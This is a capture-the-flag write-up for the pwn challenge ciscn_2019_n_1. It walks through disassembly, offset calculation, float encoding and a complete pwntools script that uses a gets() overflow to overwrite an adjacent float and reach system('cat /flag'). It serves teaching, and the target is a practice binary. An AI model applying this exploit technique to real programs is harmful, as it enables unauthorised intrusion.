# ciscn_2019_n_1

**BUUCTF · PWN · Easy** — stack buffer overflow used to corrupt an adjacent local variable, bypassing a floating-point comparison guard without ever touching the return address.

---

## TL;DR

A buffer overflow where the goal isn't to hijack control flow at all. The vulnerable
function already contains a call to `system("cat /flag")`, gated behind an `if` that
compares a local `float` to a hardcoded constant. The overflow lets us overwrite that
float directly, from outside, before the comparison runs — no ROP, no shellcode, no
alignment tricks, despite NX being enabled.

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       enabled
PIE:      No PIE (0x400000)
Stripped: No
```

---

## 1. Static Recon

```bash
file ./ciscn
pwn checksec ./ciscn
objdump -d -M intel ./ciscn
```

The standout line compared to the previous challenge in this series is `NX: enabled` — the
stack is no longer executable, which normally means shellcode injection is off the table and
a ROP chain or ret2libc would be needed to pop a shell. As this write-up shows, neither is
required here, because the vulnerability class is different from a classic ret2win.

| Protection | Status | Relevance here |
|---|---|---|
| Canary | ❌ None | Overflow isn't limited by a canary check |
| NX | ✅ Enabled | Shellcode injection is not viable — irrelevant to this exploit path anyway |
| PIE | ❌ Off | Static addresses, no leak required |
| RELRO | Partial | Not relevant to this exploit path |

---

## 2. Disassembly Walkthrough

### 2.1 `func()` — where the vulnerability and the win condition both live

```asm
400676: push rbp
400677: mov  rbp, rsp
40067a: sub  rsp, 0x30            ; 48 bytes of locals

40067e: pxor   xmm0, xmm0
400682: movss  [rbp-0x4], xmm0    ; local float `check` initialized to 0.0

; puts("Let's guess the number.")

400691: lea  rax, [rbp-0x30]      ; buffer starts at rbp-0x30
40069d: call gets@plt             ; <-- the vulnerability: unbounded read

4006a2: movss   xmm0, [rbp-0x4]              ; reload `check`
4006a7: ucomiss xmm0, [rip+0x146]            ; compare against a constant
4006ae: jp      4006cf                       ; unordered (NaN) -> fail path
4006b0: movss   xmm0, [rbp-0x4]
4006b5: ucomiss xmm0, [rip+0x138]            ; compare again
4006bc: jne     4006cf                       ; not equal -> fail path

4006be: mov  edi, 0x4007cc        ; "cat /flag"
4006c8: call system@plt           ; win path
4006cd: jmp  4006d9

4006cf: mov  edi, 0x4007d6        ; "Its value should be 11.28125"
4006d4: call puts@plt             ; fail path
```

In C terms, this is roughly:

```c
void func(void) {
    float check = 0.0f;
    char buf[44];

    puts("Let's guess the number.");
    gets(buf);                 // no bounds checking

    if (check == 11.28125f) {
        system("cat /flag");
    } else {
        puts("Its value should be 11.28125");
    }
}
```

`check` is never set by any user-facing input path in the source logic — it stays `0.0`
unless the overflow is used to reach past the end of `buf` and land directly on it.

### 2.2 `main()`

Just two `setvbuf()` calls to disable buffering on stdout/stdin, then a single call into
`func()`. Nothing relevant to the exploit here.

---

## 3. Where the Bug Is

Same root cause as a classic stack buffer overflow:

```asm
40069d: call gets@plt
```

`gets()` reads from stdin with no length limit, writing into a fixed 44-ish byte stack
buffer. The difference from a "normal" ret2win is **what sits directly above the buffer in
memory** — here it's not the saved RBP and return address first, it's another local
variable, `check`, placed by the compiler at `rbp-0x4`, immediately above the buffer at
`rbp-0x30`.

```
higher addresses
┌───────────────────────────┐
│  Return Address (8B)      │
├───────────────────────────┤
│  Saved RBP (8B)           │
├───────────────────────────┤
│  check (float, 4B) @ rbp-0x4
├───────────────────────────┤
│  buf (44B) @ rbp-0x30     │
└───────────────────────────┘
lower addresses
```

An overflow large enough reaches `check` long before it would need to reach the return
address — and reaching `check` is all that's required to win.

---

## 4. Calculating the Offset

Straight subtraction from the two `lea`/`movss` operands in the disassembly, no dynamic
verification needed since the addressing is unambiguous:

```
buffer start:    rbp - 0x30
target variable: rbp - 0x4

offset = (rbp - 0x4) - (rbp - 0x30)
        = 0x30 - 0x4
        = 0x2c
        = 44 bytes
```

The first 44 bytes of input fill `buf` exactly; byte 45 onward lands directly on `check`.

---

## 5. Extracting the Target Value

The constant compared against `check` lives in `.rodata`:

```bash
objdump -s -j .rodata ./ciscn
```

```
4007f0 32350000 00803441
```

The 4 bytes at `0x4007f4` are `00 80 34 41`. Reading this little-endian memory dump as a
big-endian IEEE-754 bit pattern for inspection:

```
raw memory order:  00 80 34 41
as a 32-bit value: 0x41348000
→ decodes to:       11.28125
```

This is confirmed independently by the fail-path string, extracted with `strings -t x`:

```
7d6  "Its value should be 11.28125"
```

Worth calling out explicitly: **this value is `11.28125`, not `11.28`.** A couple of
published write-ups for this exact challenge round it to `11.28`, which looks harmless but
isn't — floating point equality (`ucomiss` + `jne`) is exact, not approximate, so a rounded
guess fails the check. Extracting the bit pattern directly from the binary instead of
trusting a remembered or copied value is what avoids this.

Other relevant strings pulled from the same binary:

```
7b4  "Let's guess the number."   ← prompt before gets()
7cc  "cat /flag"                 ← system()'s argument — no interactive shell needed
7d6  "Its value should be 11.28125"
```

---

## 6. Why No Stack-Alignment Fix Is Needed Here

Worth contrasting explicitly with a classic ret2win, because the two look superficially
similar (both are `gets()` overflows) but require entirely different exploit construction.

In a ret2win-style exploit, the return address is overwritten directly and reached via a
`ret` instruction instead of a real `call` — this desyncs the ABI's 16-byte stack-alignment
invariant and can crash deep inside `system()` on SSE instructions, requiring a `ret`
gadget to correct.

Here, `system()` is called via a completely ordinary, compiler-generated `call` instruction
*from inside `func()` itself* — `call system@plt` at `0x4006c8`. Control flow is never
hijacked; only a comparison's outcome is changed by overwriting a value it reads. The ABI
alignment invariant is never touched, because no `ret`-based jump into another function
occurs. No alignment gadget is needed.

---

## 7. Final Exploit

```python
from pwn import *
import struct

context.arch = 'amd64'

p = remote('<host>', <port>)   # or process('./ciscn') for local testing

PADDING   = 44                            # distance from buf to `check`
FLOAT_VAL = struct.pack('<f', 11.28125)   # exact IEEE-754 bit pattern, extracted from .rodata

payload = b'A' * PADDING + FLOAT_VAL

p.recvuntil(b"Let's guess the number.")
p.sendline(payload)

p.interactive()
```

### Notes on `struct.pack('<f', ...)`

This is a different beast from `p64()` used for return-address overwrites:

| | `p64(addr)` | `struct.pack('<f', val)` |
|---|---|---|
| Input | integer (a memory address) | floating-point number |
| Output | 8 bytes | 4 bytes |
| Encoding | plain little-endian integer | IEEE-754 single-precision (sign/exponent/mantissa) |

Floats are not stored in memory the same way integers are — sending the raw integer `1128`
instead of the actual IEEE-754 bit pattern for `11.28125` would fail the comparison, even
though both "represent" numbers that look superficially related. `struct.pack('<f', ...)`
produces exactly the bytes the CPU expects for a 32-bit float comparison.

---

## 8. On GDB Usage for This Challenge

Unlike a ret2win-style challenge, this one didn't require a debugger to solve:

- The offset came directly and unambiguously from two `lea`/`movss` operands in the static
  disassembly — no need to confirm it empirically with a cyclic pattern.
- Because control flow is never hijacked (no overwritten return address, no `ret` into an
  attacker-chosen address), there's no stack-alignment crash to diagnose, and therefore no
  need to inspect `rsp` at a breakpoint.

That said, confirming the overwrite with GDB is a good sanity check and a useful way to see
*exactly* where a local variable sits on the stack relative to a buffer — something worth
doing once for intuition even when it isn't strictly required to get the flag:

```
pwndbg> break *0x4006a2      ; right where `check` is reloaded for comparison
pwndbg> run
(send the payload)
pwndbg> x/4xb $rbp-0x4
```

The 4 bytes shown should read `00 80 34 41` — exactly the bytes that were sent, sitting
precisely where the compiler placed `check`, confirming the overwrite landed where the
static analysis predicted.

**Rule of thumb carried forward from this challenge:** a debugger is essential whenever an
exploit reaches a function via `ret` instead of `call` (ret2win, ROP, ret2libc) — alignment
and control-flow correctness can only be confirmed by watching registers live. It's optional
when an overflow only corrupts adjacent data and the compiler-generated call graph is left
untouched, as is the case here.

---

## Key Takeaways

- Not every stack overflow is a return-address hijack. Overwriting an adjacent local
  variable to flip a comparison can be just as effective — and sidesteps NX entirely, since
  no new code or control-flow redirection is ever introduced.
- Always extract comparison constants (and any "hardcoded" values) directly from the
  binary's `.rodata`, byte for byte, rather than trusting a remembered or previously
  published value — a seemingly close approximation (`11.28` vs `11.28125`) is enough to
  fail an exact floating-point comparison.
- Floats require `struct.pack('<f', ...)` / `'<d'` for doubles — never pack them as
  integers; the IEEE-754 encoding is structurally different from a plain integer's bytes.
- GDB is a tool for confirming a theory, not a mandatory ritual for every challenge. Reach
  for it when control flow is hijacked via `ret`, or when an offset is genuinely ambiguous
  from static analysis alone — skip it when the static analysis already fully determines the
  exploit.

---

